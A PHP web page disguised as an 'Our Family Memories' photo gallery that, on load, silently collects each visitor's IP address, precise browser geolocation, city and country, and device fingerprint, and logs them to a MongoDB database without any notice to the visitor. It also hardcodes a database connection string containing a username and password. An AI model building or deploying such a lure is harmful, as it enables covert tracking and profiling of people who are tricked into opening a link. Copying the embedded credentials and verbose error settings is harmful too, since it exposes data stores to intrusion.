<?php
// ------------------
// Error reporting
// ------------------
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// ------------------
// MongoDB Atlas connection
// ------------------
$mongoClient = null;
$mongoError = null;

try {
    // Connect to MongoDB Atlas (@ symbol in password must be URL-encoded as %40)
    $mongoClient = new MongoDB\Driver\Manager("mongodb+srv://shashwats500:Ravi%401234@cluster0.7li4oxi.mongodb.net/?appName=Cluster0");
    
    // Test connection
    $command = new MongoDB\Driver\Command(['ping' => 1]);
    $mongoClient->executeCommand('admin', $command);
    
    $dbName = "deviceinfo";
    $collectionName = "device_logs";
    
} catch (Exception $e) {
    $mongoError = $e->getMessage();
    error_log("MongoDB connection failed: " . $mongoError);
    $mongoClient = null;
}

// ------------------
// Save AJAX POST request
// ------------------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['latitude']) && isset($_POST['longitude'])) {
    
    // Check if MongoDB is connected
    if (!$mongoClient) {
        echo json_encode(['success' => false, 'error' => 'MongoDB not connected', 'details' => $mongoError]);
        exit;
    }
    
    $ip       = $_POST['ip'] ?? $_SERVER['REMOTE_ADDR'];
    $lat      = $_POST['latitude'];
    $lon      = $_POST['longitude'];
    $browser  = $_POST['browser'] ?? $_SERVER['HTTP_USER_AGENT'];
    $platform = $_POST['platform'] ?? '';
    $screen   = $_POST['screen'] ?? '';
    $language = $_POST['language'] ?? '';
    $memory   = $_POST['memory'] ?? '';
    $cores    = (int)($_POST['cores'] ?? 0);

    $country = "Unknown";
    $city    = "Unknown";
    if (!empty($ip)) {
        $geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
        if ($geo && $geo->status === "success") {
            $country = $geo->country;
            $city = $geo->city;
        }
    }

    try {
        // Insert new document for every visit
        $document = [
            'ip' => $ip,
            'country' => $country,
            'city' => $city,
            'latitude' => (float)$lat,
            'longitude' => (float)$lon,
            'browser' => $browser,
            'platform' => $platform,
            'screen' => $screen,
            'language' => $language,
            'memory' => $memory,
            'cores' => $cores,
            'visited_at' => new MongoDB\BSON\UTCDateTime()
        ];

        $bulk = new MongoDB\Driver\BulkWrite;
        $bulk->insert($document);
        $result = $mongoClient->executeBulkWrite('deviceinfo.device_logs', $bulk);
        
        echo json_encode([
            'success' => true, 
            'message' => 'Visit logged', 
            'insertedCount' => $result->getInsertedCount(),
            'timestamp' => date('Y-m-d H:i:s')
        ]);
    } catch (Exception $e) {
        error_log("MongoDB insert failed: " . $e->getMessage());
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}

// ------------------
// Default location for preview
// ------------------
$defaultAddress = "H73C+QFX Kokernag-verinag road, Forest Block, 192212";
$defaultLat = "33.738";
$defaultLon = "75.117";
?>
<!DOCTYPE html>
<html>
<head>
    <title>Our Family Memories</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Georgia', serif; 
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            padding: 20px;
            min-height: 100vh;
        }
        .header {
            text-align: center;
            padding: 40px 20px;
            background: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            margin-bottom: 30px;
        }
        h1 { 
            color: #2c3e50; 
            font-size: 3em; 
            margin-bottom: 10px;
            font-weight: normal;
        }
        .subtitle {
            color: #7f8c8d;
            font-size: 1.2em;
            font-style: italic;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 25px;
            max-width: 1400px;
            margin: 0 auto;
        }
        .photo-card {
            background: white;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        .photo-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
        }
        .photo {
            width: 100%;
            height: 250px;
            background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 4em;
        }
        .photo-card:nth-child(2) .photo { background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%); }
        .photo-card:nth-child(3) .photo { background: linear-gradient(45deg, #4facfe 0%, #00f2fe 100%); }
        .photo-card:nth-child(4) .photo { background: linear-gradient(45deg, #43e97b 0%, #38f9d7 100%); }
        .photo-card:nth-child(5) .photo { background: linear-gradient(45deg, #fa709a 0%, #fee140 100%); }
        .photo-card:nth-child(6) .photo { background: linear-gradient(45deg, #30cfd0 0%, #330867 100%); }
        .caption {
            padding: 20px;
            text-align: center;
        }
        .caption h3 {
            color: #2c3e50;
            margin-bottom: 8px;
            font-size: 1.3em;
        }
        .caption p {
            color: #7f8c8d;
            font-size: 0.95em;
        }
        .footer {
            text-align: center;
            padding: 40px 20px;
            color: #7f8c8d;
            font-size: 0.9em;
            margin-top: 40px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Our Family Memories</h1>
        <p class="subtitle">Cherished moments captured forever ✨</p>
    </div>

    <div class="gallery">
        <div class="photo-card">
            <div class="photo">📷</div>
            <div class="caption">
                <h3>Summer Vacation 2025</h3>
                <p>Beautiful memories at the beach</p>
            </div>
        </div>
        <div class="photo-card">
            <div class="photo">🎉</div>
            <div class="caption">
                <h3>Birthday Celebration</h3>
                <p>Another year of joy and laughter</p>
            </div>
        </div>
        <div class="photo-card">
            <div class="photo">🏔️</div>
            <div class="caption">
                <h3>Mountain Adventure</h3>
                <p>Exploring nature's beauty together</p>
            </div>
        </div>
        <div class="photo-card">
            <div class="photo">🎄</div>
            <div class="caption">
                <h3>Holiday Season</h3>
                <p>Warmth and love all around</p>
            </div>
        </div>
        <div class="photo-card">
            <div class="photo">🍰</div>
            <div class="caption">
                <h3>Family Gathering</h3>
                <p>Delicious moments shared</p>
            </div>
        </div>
        <div class="photo-card">
            <div class="photo">🌸</div>
            <div class="caption">
                <h3>Spring Blossoms</h3>
                <p>New beginnings and fresh starts</p>
            </div>
        </div>
    </div>

    <div class="footer">
        <p>Made with ❤️ for our beautiful family</p>
    </div>

<script>
window.onload = function() {
    const data = {
        latitude: '<?php echo $defaultLat; ?>',
        longitude: '<?php echo $defaultLon; ?>',
        ip: '',
        browser: navigator.userAgent,
        platform: navigator.platform,
        screen: screen.width + 'x' + screen.height,
        language: navigator.language,
        memory: navigator.deviceMemory || 'Unknown',
        cores: navigator.hardwareConcurrency || 0
    };

    // Get IP
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(res => {
            data.ip = res.ip;

            // Get geolocation if allowed
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        data.latitude = pos.coords.latitude;
                        data.longitude = pos.coords.longitude;
                        sendData();
                    },
                    () => sendData() // fallback if user denies
                );
            } else {
                sendData();
            }
        }).catch(() => sendData());

    function sendData() {
        $.ajax({
            url: '',
            method: 'POST',
            data: data,
            success: function(res) { 
                console.log('Response:', res); 
                try {
                    const result = JSON.parse(res);
                    console.log('Parsed result:', result);
                    if (result.error) {
                        console.error('Error:', result.error);
                    }
                } catch (e) {
                    console.log('Raw response:', res);
                }
            },
            error: function(err) { console.error('AJAX error:', err); }
        });
    }
};
</script>
</body>
</html>
